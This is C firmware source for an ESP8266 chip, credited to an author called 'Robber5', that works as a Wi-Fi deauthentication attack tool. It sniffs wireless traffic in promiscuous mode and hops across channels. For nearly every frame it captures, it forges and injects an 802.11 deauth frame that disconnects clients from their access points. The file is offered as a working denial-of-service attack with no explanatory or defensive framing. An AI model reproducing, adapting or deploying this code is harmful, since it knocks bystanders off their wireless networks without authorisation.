/*
	Author: Robber5
	http://www.zh-y.com
*/

#include "ets_sys.h"
#include "osapi.h"
#include "gpio.h"
#include "os_type.h"
#include "mem.h"
#include "user_config.h"
#include "user_interface.h"
#include "driver/uart.h"
#include "user_main.h"


static volatile os_timer_t channelHop_timer;

uint16_t seq = 0;

static uint8_t boardcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
static uint8_t ap[6] = {0xec, 0x26, 0xca, 0x66, 0x66, 0x66};

static void ICACHE_FLASH_ATTR 
channelHop(void *arg)
{
	// 1 - 13 channel hopping
	uint8 new_channel = wifi_get_channel() % 12 + 1;
	//os_printf("** hop to %d **\n", new_channel);
	wifi_set_channel(new_channel);
}

void send_deauth_packet(uint8_t *sta, uint8_t *ap)
{
	os_printf("SEND: DEAUTH (AP => STA)\t");

	char packet_buffer[200] = {0};
	ieee80211_mgmt_frame mgmt;
	ets_bzero(&mgmt, sizeof(ieee80211_mgmt_frame));


	seq ++;
	mgmt.ctl.type = 0x00;
	mgmt.ctl.subtype = 0x0c;	//WLAN_FSTYPE_DEAUTHEN

	mgmt.duration = 0x13a;
	memcpy(&mgmt.addr1, sta, 6);		//DA
	memcpy(&mgmt.addr2, ap, 6);		//SA
	memcpy(&mgmt.addr3, ap, 6);		//BSSID

	mgmt.seq_ctrl = seq<<4;

	char pay_load[] = "\x01\x00";

	int i = 0;
	memcpy(&packet_buffer[i], &mgmt, sizeof(ieee80211_mgmt_frame));
	i = sizeof(ieee80211_mgmt_frame);
	memcpy(&packet_buffer[i], pay_load, sizeof(pay_load));
	i += sizeof(pay_load) - 1;

	int ret = wifi_send_pkt_freedom(packet_buffer, i , 0);

	os_printf("RESULT: %d\n", ret);

}

void deny_of_serivce(uint8_t *buf, unsigned int len)
{
	ieee80211_mgmt_frame *mgmt = (ieee80211_mgmt_frame *)buf;
	int type = mgmt->ctl.type;
	int subtype = mgmt->ctl.subtype;

	if (strcmp(mgmt->addr1,  boardcast) != 0x00)
	{
		send_deauth_packet(mgmt->addr2, mgmt->addr1);
		return;
	}
}

/* Listens communication between AP and client */
static void ICACHE_FLASH_ATTR
promisc_cb(uint8_t *buf, uint16_t len)
{
	struct RxPacket * pkt = (struct RxPacket*) buf;
	deny_of_serivce((uint8_t *)&pkt->data, len );
}

static void ICACHE_FLASH_ATTR
sniffer_system_init_done(void)
{
	wifi_station_disconnect();
	wifi_station_set_config(NULL);

	wifi_set_channel(1);			//SET CHANNEL
	wifi_promiscuous_enable(0);
	wifi_set_promiscuous_rx_cb(promisc_cb);	
	wifi_promiscuous_enable(1);

	#if 1
	os_timer_disarm(&channelHop_timer);
	os_timer_setfn(&channelHop_timer, (os_timer_func_t *) channelHop, NULL);
	os_timer_arm(&channelHop_timer, CHANNEL_HOP_INTERVAL, 1);
	#endif
}


void ICACHE_FLASH_ATTR
user_init()
{
	uart_init(115200, 115200);
	os_printf("\n\nSDK version:%s\n", system_get_sdk_version());
	os_printf("http://www.zh-y.com\n");


	wifi_set_opmode(STATION_MODE);
	system_init_done_cb(sniffer_system_init_done);
}
